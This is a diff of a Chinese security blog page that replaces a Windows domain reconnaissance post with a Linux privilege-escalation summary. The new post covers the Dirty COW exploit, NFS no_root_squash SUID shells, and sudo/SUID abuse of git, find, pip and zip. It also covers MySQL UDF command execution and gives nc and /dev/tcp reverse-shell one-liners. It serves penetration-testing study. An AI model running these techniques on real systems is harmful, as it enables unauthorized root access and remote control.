@@ -6,32 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>域内信息搜集 | Solkatt的小窝</title>
+  <title>Liunx提权总结 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="域内信息搜集一、判断自己的身份判断自己的身份最简单的方式就是whoami 如果是本地非域用户的话，就是计算机名称&#x2F;账号  如果是域内用户账号的话，就是域名称&#x2F;账号  123nslookup -qt&#x3D;ns lab.com  &#x2F;&#x2F;定位DCnet time &#x2F;domain &#x2F;&#x2F;查看时间服务器hostname &#x2F;&#x2F;查看本机名字">
+  <meta name="description" content="Liunx提权总结Liunx内核提权Cve-2016-5195脏牛漏洞，又叫Dirty COW，存在Liunx内核中已经有长达9年的时间，在2007年发布的liunx内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。 该漏洞具体为，Liunx内核的内存子系统在处理写入时复制时产生了竞争条件(race confition)。恶意用户可以利用此漏洞，来">
 <meta property="og:type" content="article">
-<meta property="og:title" content="域内信息搜集">
-<meta property="og:url" content="https://example.com/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:title" content="Liunx提权总结">
+<meta property="og:url" content="https://example.com/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
-<meta property="og:description" content="域内信息搜集一、判断自己的身份判断自己的身份最简单的方式就是whoami 如果是本地非域用户的话，就是计算机名称&#x2F;账号  如果是域内用户账号的话，就是域名称&#x2F;账号  123nslookup -qt&#x3D;ns lab.com  &#x2F;&#x2F;定位DCnet time &#x2F;domain &#x2F;&#x2F;查看时间服务器hostname &#x2F;&#x2F;查看本机名字">
+<meta property="og:description" content="Liunx提权总结Liunx内核提权Cve-2016-5195脏牛漏洞，又叫Dirty COW，存在Liunx内核中已经有长达9年的时间，在2007年发布的liunx内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。 该漏洞具体为，Liunx内核的内存子系统在处理写入时复制时产生了竞争条件(race confition)。恶意用户可以利用此漏洞，来">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235145684.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235255908.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235536326.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220001656102.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220002424852.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220003159391.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220004301275.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005025693.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005512106.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005909927.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220010236881.png">
-<meta property="article:published_time" content="2022-02-19T15:31:41.000Z">
-<meta property="article:modified_time" content="2022-02-26T10:40:19.840Z">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093022033.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093957604.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224115822604.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226173258537.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226174052385.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226183137728.png">
+<meta property="article:published_time" content="2022-02-24T01:00:25.000Z">
+<meta property="article:modified_time" content="2022-02-26T10:40:11.237Z">
 <meta property="article:author" content="Solkatt">
-<meta property="article:tag" content="web安全的杂杂念">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235145684.png">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093022033.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -159,95 +153,216 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-域内信息搜集" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Liunx提权总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      域内信息搜集
+      Liunx提权总结
     </h1>
   
 
         
-        <a href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="archive-article-date">
-  	<time datetime="2022-02-19T15:31:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-19</time>
+        <a href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2022-02-24T01:00:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><h1 id="一、判断自己的身份"><a href="#一、判断自己的身份" class="headerlink" title="一、判断自己的身份"></a>一、判断自己的身份</h1><p>判断自己的身份最简单的方式就是whoami</p>
-<p>如果是本地非域用户的话，就是计算机名称/账号</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235145684.png" alt="image-20220219235145684"></p>
-<p>如果是域内用户账号的话，就是域名称/账号</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235255908.png" alt="image-20220219235255908"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ns lab.com  //定位DC</span><br><span class="line">net time /domain //查看时间服务器</span><br><span class="line">hostname //查看本机名字</span><br></pre></td></tr></table></figure>
+        <h1 id="Liunx提权总结"><a href="#Liunx提权总结" class="headerlink" title="Liunx提权总结"></a>Liunx提权总结</h1><h2 id="Liunx内核提权"><a href="#Liunx内核提权" class="headerlink" title="Liunx内核提权"></a>Liunx内核提权</h2><h3 id="Cve-2016-5195"><a href="#Cve-2016-5195" class="headerlink" title="Cve-2016-5195"></a>Cve-2016-5195</h3><p>脏牛漏洞，又叫Dirty COW，存在Liunx内核中已经有长达9年的时间，在2007年发布的liunx内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p>
+<p>该漏洞具体为，Liunx内核的内存子系统在处理写入时复制时产生了竞争条件(race confition)。恶意用户可以利用此漏洞，来获取高权限，对只读内存映射进行访问。竞争条件，指的是任务执行顺序异常，这样可能会导致应用崩溃，或者是令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>
+<p>Liunx内核&gt;=2.6.22</p>
+<p>触发代码:<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
+<p>代码分析：</p>
+<p>main函数将用户输入的只读文件mmap映射，flag参数是map_private其只读。map_private属性会对此内存写入时，创建一个cow的副本，然后创建2个线程<code>madviseThread</code>和<code>procselfmenThread</code>，其中<code>procselfmenThread</code>通过<code>/proc/self/mem</code>文件尝试向被映射的内存不断写入数据，<code>madviseThread</code>则不断调用取消映射，两个线程不断操作。竞争条件触发只读文件写入权限，流畅在内核代码中。</p>
+<p>触发方式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#echo this is not a test &gt; foo</span><br><span class="line">#chmod 0404 foo</span><br><span class="line">$ ls -lah foo</span><br><span class="line">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span><br><span class="line">$ cat foo</span><br><span class="line">this is not a test</span><br><span class="line">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">$ ./dirtyc0w foo m00000000000000000</span><br><span class="line">mmap 56123000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 1800000000</span><br><span class="line">$ cat foo</span><br><span class="line">m00000000000000000</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235536326.png" alt="image-20220219235536326"></p>
+<p>exp1:<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>exp2:<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p>将exp1上传到目标机器，使用gcc-pthread dirty.c -o dirty -lcrypt命令对dirty.c进行编译，生成一个dirty的可执行文件。</p>
+<p>将exp2上传到目标机器，解压，进入解压目录。</p>
+<p>执行make后生成可执行文件dcow，执行./dcow -s如果成功的话，就可以返回一个root权限的shell</p>
+<h4 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h4><p>这里直接使用网上靶场复现：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093022033.png" alt="image-20220224093022033"></p>
+<p>如果可以写入写入foo文件，表示该机器存在脏牛提权漏洞。</p>
 <span id="more"></span>
 
-<h1 id="二、定位DC及获取用户、组信息"><a href="#二、定位DC及获取用户、组信息" class="headerlink" title="二、定位DC及获取用户、组信息"></a>二、定位DC及获取用户、组信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net config workstation //查询当前登陆域及登录的用户信息</span><br><span class="line">net user /domain  //查询域内用户</span><br><span class="line">wmic useraccount get /all 查询域内用户的详细信息</span><br><span class="line">net accounts /domain 查看域的密码策略</span><br><span class="line">net user xxx /domain  查看指定域用户lab的详细信息</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:xxx 查看域内的主机</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domainn users&quot; //查看域用户</span><br><span class="line">net group &quot;domain controllers&quot; /domian 查看域控制器</span><br><span class="line">net group &quot;domain computers&quot; /domain查看域内所有主机</span><br><span class="line">net group &quot;domain admins&quot; /domain查看域管理员，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;enterprise admins&quot; /domain 查看企业管理组，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;domain guest&quot; /domain 查看域访客组，权限较低</span><br><span class="line">net accounts /domain #查询域密码策略</span><br><span class="line">whoami /user #查看⽤户SID和域SID</span><br></pre></td></tr></table></figure>
+<h3 id="利用kali进行内核提权"><a href="#利用kali进行内核提权" class="headerlink" title="利用kali进行内核提权"></a>利用kali进行内核提权</h3><p>查看系统发行版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220001656102.png" alt="image-20220220001656102"></p>
-<p>域的sid是500之前的，用户sid是500</p>
-<p>当你是域控用户的时候可以输入以下命令查询域内信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dsquery user #查询⽬录中的⽤户</span><br><span class="line">dsquery computer #查询⽬录中的主机</span><br><span class="line">dsquery group #查询⽬录中的组</span><br><span class="line">dsquery ou #查询⽬录中的组织单元</span><br><span class="line">dsquery site #查询⽬录中的站点</span><br><span class="line">dsquery server #查询域控</span><br><span class="line">dsquery contact #查询⽬录中的联系⼈</span><br><span class="line">dsquery subnet #查询⽬录中的⼦⽹</span><br><span class="line">dsquery quota #查询⽬录中的配额规定</span><br><span class="line">dsquery partition #查询⽬录中的分区</span><br><span class="line">dsquery server –domain lab.com | dsget server–dnsname –site #搜索域内</span><br><span class="line">域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name -xp –limit n #搜索域内以-xp结尾的机</span><br><span class="line">器n台</span><br><span class="line">dsquery user domainroot –name admin -limit n #搜索域内以admin开头</span><br><span class="line">的⽤户n个</span><br></pre></td></tr></table></figure>
+<p>查看内核版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>
+
+<p>搜索该版本漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit xxxx XXXXX</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093957604.png" alt="image-20220224093957604"></p>
+<p>把对应版本的文件上传到服务器编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure>
+
+<p>运行然后输入密码，再通过命令切换用户即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h2><p>netstat-antup 查看各种网络服务</p>
+<p><strong>NFS提权</strong></p>
+<p>什么是NFS？</p>
+<p>网络文件系统(NFS)是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准，网络附加存储(NAS)之一。</p>
+<p>NFS是基于UDP/IP协议的应用，其实现主要是采用远程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
+<p><strong>什么是root_sqaush和no_root_saush</strong>？</p>
+<p>Root Squashing(root_sqaush)参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户”nfsnobody”，它具有最少的本地特权.如果no_root_squash选项开启的话，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用”root_squash”权限。</p>
+<p>注意：要利用此，<strong>no_root_squash</strong>选项得开启。</p>
+<p><strong>利用NFS并获取Root Shell</strong></p>
+<p>现在，我们拿到了一个低权限的shell，我们查看”/etc/exports”文件。</p>
+<p><strong>/etc/exports</strong>文件包含哪些文件夹/文件系统导出到远程用户的配置和权限。</p>
+<p>这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成：</p>
+<p><code>[共享的目录][主机名或ip(参数，参数)]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其中参数是可选的，当不指定参数时，nfs将使用默认选项。默认的共享选项是</span><br><span class="line">sync，ro,root_squash,no_delay</span><br><span class="line">当主机名或ip地址为空时，则代表共享给任意客户机提供服务。</span><br><span class="line">当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样:</span><br><span class="line">[共享的目录][主机名1或ip1(参数1，参数2)][主机名2或ip2(参数3，参数4)]</span><br></pre></td></tr></table></figure>
+
+<p>当服务器中存在nfs共享，且开启了no_root_squash选项时，这时如果客户端使用的是root权限，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。</p>
+<p>查看nfs服务器上的共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo showmount -e x.x.x.x(nfs主机ip)</span><br></pre></td></tr></table></figure>
+
+<p>创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /tmp</span><br><span class="line">sudo mount -t nof x.x.x.x:/home/test /tmp</span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>回到要提权的服务器上，使用普通用户使用shell-p来获取root权限。</p>
+<h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin//bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h2><p>如果将SUID权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道<code>find</code>命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p>
+<p>拿到普通用户权限之后，使用sudo -l查看下，查看当前用户是否存在当前用户可以调用sudo的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch getshell</span><br><span class="line">find / -type f -name getshell -exec &quot;whoami&quot; \;</span><br><span class="line">find / -type f -name getshell -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="三、登陆历史"><a href="#三、登陆历史" class="headerlink" title="三、登陆历史"></a>三、登陆历史</h1><p>最原始的方式是通过注册表里HKEY_USERS的key值来查询谁登录过本机，同样也调用到了 NetSessionEnum API。但是有以下工具可以帮助我们快速查看</p>
-<h2 id="1-psloggedon-exe"><a href="#1-psloggedon-exe" class="headerlink" title="1.psloggedon.exe"></a>1.psloggedon.exe</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">PsLoggedOn - Windows Sysinternals | Microsoft Docs</a></p>
-<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\域名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm 4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;;</span><br><span class="line">如果有find执行</span><br><span class="line">touch test</span><br><span class="line">find . -exec /bin/sh -p \; -quit</span><br><span class="line">这时候，就拥有了root权限的一个shell</span><br><span class="line"></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u=s 表示查找root用户拥有的文件</span><br><span class="line">-type 表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2 表示该进程的第二个文件描述符，即stderr</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容</span><br></pre></td></tr></table></figure>
+
+<p>nc反向反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/dirty -exec nc x.x.x.x 8888 -t -e /bin/sh \;</span><br><span class="line">find /var/www/dirty -exec bash -i &gt; &amp; /dev/tcp/127.0.0.1/443 0 &gt;&amp;1 \;</span><br></pre></td></tr></table></figure>
+
+<h2 id="pip提权"><a href="#pip提权" class="headerlink" title="pip提权"></a>pip提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt;</span><br><span class="line">$TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>
+
+<h2 id="zip提权"><a href="#zip提权" class="headerlink" title="zip提权"></a>zip提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip $TF /etc/hosts -T -TT &#x27;sh #&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>在⾏动之前，我们需要搞清楚，⽬标主机上是否存在MySQL、MySQL运⾏在默认的端⼝还是指定的端⼝、MySQL 的版本信息、MySQL⽤户信息等等。Mysql默认端⼝是3306端⼝，但也有⾃定义端⼝，针对默认端⼝扫描主要利⽤ 扫描软件进⾏探测。我们可以⽤nmap等端⼝扫描⼯具对MySQL的端⼝进⾏扫描。如果已经获得了⽬标MySQL的密 码，我们可以使⽤该⽤户名和密码扫描获取指定IP地址的端⼝信息以及mysql数据库相关信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC 192.168.1.13</span><br><span class="line">nmap -sV -sC 192.168.1.13 -p 3306</span><br></pre></td></tr></table></figure>
+
+<p>Nmap还内置了多个mysql相关脚本，有审计、暴力破解、hash、空密码扫描、枚举、基本信息、查询、变量等：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nmap/scripts/mysql-audit.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-brute.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-databases.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-dump-hashes.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-empty-password.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-enum.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-info.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-query.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-users.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-variables.nse</span><br><span class="line">/usr/share/nmap/scripts/mysql-vuln-cve2012-2122.nse</span><br></pre></td></tr></table></figure>
+
+<p>Metasploit也有几个可用于收集mysql信息的模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取mysql相关信息:</span><br><span class="line">auxiliary/admin/mysql/mysql_enum </span><br><span class="line">auxiliary/scanner/mysql/mysql_version</span><br><span class="line">文件枚举和目录可写信息枚举:</span><br><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_writable_dirs</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以通过使用sqlmap来通过注入点扫描获取目标数据库的信息。sqlmap在测试注入点的时候，会枚举出目标主机的数据库类型，版本等信息。</p>
+<h3 id="mysql-udf提权执行系统命令"><a href="#mysql-udf提权执行系统命令" class="headerlink" title="mysql udf提权执行系统命令"></a>mysql udf提权执行系统命令</h3><p>UDF是MySQL的一个拓展接口，UDF(Userdefined function)可翻译为用户自定义函数，这个是用来拓展mysql的技术手段。</p>
+<p>使⽤过MySQL的⼈都知道，MySQL有很多内置函数提供给使⽤者，包括字符串函数、数值函数、⽇期和时间函数 等，给开发⼈员和使⽤者带来了很多⽅便。MySQL的内置函数虽然丰富，但毕竟不能满⾜所有⼈的需要，当 MySQL的内置函数不能满⾜需要的时候，就需要对MySQL进⾏⼀些扩展，幸运的是，MySQL给使⽤者提供了添加 新函数的机制，这种使⽤者⾃⾏添加的MySQL函数就称为UDF(User Define Function)。</p>
+<p>当我们有了数据库读取和写⼊权限以后，我们就可以尝试使⽤UDF提权的⽅法，从数据库root权限提升到系统的管理员权限。</p>
+<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>UDF得使用需要调用其动态链接库文件(.dll或.so)，使用udf提权原理大概是通过引入恶意的udf.dll，引入自定义函数(如sys_eval()函数)，执行系统命令。</p>
+<p>利用条件：</p>
+<ol>
+<li>掌握mysql数据库的账户，拥有对mysql的insert和delete权限，以此创建和抛弃函数</li>
+<li>当前用户拥有可以将udf.dll写入相应目录的权限</li>
+<li>如果mysql版本小于5.1且为windows系统，则udf.dll文件存放在C:\windows或者C:\windows\system32目录下。</li>
+<li>如果mysql版本大于5.1. udf.dll文件必须放置在mysql安装目录的lib/plugin文件夹下，该plugin目录默认不存在，需要创建。</li>
+</ol>
+<p>假设我的udf文件名为udf.dll，存放在mysql安装目录的lib/plugin目录下(mysql&gt;5.1)：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224115822604.png" alt="image-20220224115822604"></p>
+<p>在udf.dll文件中，我定义了一个名为sys_eval()的mysql函数，该函数可以执行系统任意命令。但是如果我现在就打开mysql命令行，使用select sys_eval(‘whoami’)；的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把udf.dll放到了lib/plugin目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包的类你是用不了的。所以，我们应该把udf.dll中的自定义函数引入进来。引入的方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>sys_eval:我们要引入的函数名。</p>
+<p>udf.dll：我们要从中引入函数的链接库文件</p>
+<p>成功引入函数后，可以查看一下mysql函数里面新增了sys_eval：</p>
